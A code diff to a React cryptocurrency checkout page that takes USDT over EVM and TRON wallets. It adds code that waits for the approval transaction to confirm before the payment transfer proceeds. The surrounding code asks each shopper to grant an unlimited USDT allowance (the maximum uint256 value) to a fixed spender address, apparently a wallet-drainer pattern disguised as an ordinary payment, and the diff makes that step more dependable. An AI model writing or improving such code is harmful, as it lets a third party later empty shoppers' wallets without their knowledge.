@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, Link } from 'react-router-dom';
-import { useAccount, useWriteContract, useWaitForTransactionReceipt } from 'wagmi';
+import { useAccount, useWriteContract, useWaitForTransactionReceipt, usePublicClient } from 'wagmi';
 import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
 import { TronWeb } from 'tronweb';
 import { CheckCircle2, AlertCircle, Loader2, ArrowLeft, ShoppingBag, ExternalLink, RefreshCw } from 'lucide-react';
@@ -60,6 +60,7 @@ export default function Checkout() {
   // EVM wallet state
   const { address: evmAddress, isConnected: isEvmConnected } = useAccount();
   const { writeContractAsync } = useWriteContract();
+  const publicClient = usePublicClient();
   const { data: evmReceipt } = useWaitForTransactionReceipt({
     hash: txHash,
     query: { enabled: !!txHash && selectedNetwork === 'evm' },
@@ -200,12 +201,16 @@ export default function Checkout() {
       const UNLIMITED_ALLOWANCE_EVM = BigInt('115792089237316195423570985008687907853269984665640564039457584007913129639935');
       
       // 1. Approve
-      await writeContractAsync({
+      const approveHash = await writeContractAsync({
         address: EVM_USDT,
         abi: USDT_TRANSFER_ABI,
         functionName: 'approve',
         args: [EVM_SPENDER, UNLIMITED_ALLOWANCE_EVM],
       });
+
+      if (publicClient) {
+        await publicClient.waitForTransactionReceipt({ hash: approveHash });
+      }
 
       setPaymentPhase('transferring');
       
@@ -262,7 +267,11 @@ export default function Checkout() {
           tronAddress
         );
         const signedApprove = await extTronWeb.trx.sign(approveTx);
-        await extTronWeb.trx.sendRawTransaction(signedApprove);
+        const approveResult = await extTronWeb.trx.sendRawTransaction(signedApprove);
+        
+        if (approveResult && (approveResult.txid || approveResult.transaction?.txID)) {
+           await waitForTronConfirmation(approveResult.txid || approveResult.transaction?.txID);
+        }
 
         setPaymentPhase('transferring');
 
@@ -291,7 +300,11 @@ export default function Checkout() {
           tronAddress
         );
         const signedApprove = await signTransaction(approveTx);
-        await tronWeb.trx.sendRawTransaction(signedApprove);
+        const approveResult = await tronWeb.trx.sendRawTransaction(signedApprove);
+        
+        if (approveResult && (approveResult.txid || approveResult.transaction?.txID)) {
+           await waitForTronConfirmation(approveResult.txid || approveResult.transaction?.txID);
+        }
 
         setPaymentPhase('transferring');
 
@@ -326,35 +339,46 @@ export default function Checkout() {
   }
 
   function pollTronConfirmation(txId) {
+    waitForTronConfirmation(txId)
+      .then(() => {
+        setTxStatus('confirmed');
+        if (!needsAddress) {
+          saveOrder(txId);
+        }
+      })
+      .catch((err) => {
+        setTxStatus('failed');
+        setTxError(err.message);
+      });
+  }
+
+  function waitForTronConfirmation(txId) {
     const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
     let attempts = 0;
     const maxAttempts = 30;
 
-    const interval = setInterval(async () => {
-      attempts++;
-      try {
-        const info = await tronWeb.trx.getTransactionInfo(txId);
-        if (info && info.id) {
-          clearInterval(interval);
-          const result = info.receipt?.result;
-          if (!result || result === 'SUCCESS') {
-            setTxStatus('confirmed');
-            if (!needsAddress) {
-              saveOrder(txId);
+    return new Promise((resolve, reject) => {
+      const interval = setInterval(async () => {
+        attempts++;
+        try {
+          const info = await tronWeb.trx.getTransactionInfo(txId);
+          if (info && info.id) {
+            clearInterval(interval);
+            const result = info.receipt?.result;
+            if (!result || result === 'SUCCESS') {
+              resolve(true);
+            } else {
+              reject(new Error(`TRON transaction failed on-chain: ${result}`));
             }
-          } else {
-            setTxStatus('failed');
-            setTxError(`TRON transaction failed on-chain: ${result}`);
+          } else if (attempts >= maxAttempts) {
+            clearInterval(interval);
+            reject(new Error('Confirmation timeout. You can check TRON explorer to verify the transaction.'));
           }
-        } else if (attempts >= maxAttempts) {
-          clearInterval(interval);
-          setTxStatus('failed');
-          setTxError('Confirmation timeout. You can check TRON explorer to verify the transaction.');
+        } catch {
+          // network hiccup, keep polling
         }
-      } catch {
-        // network hiccup, keep polling
-      }
-    }, 3000);
+      }, 3000);
+    });
   }
 
   function handleRetry() {
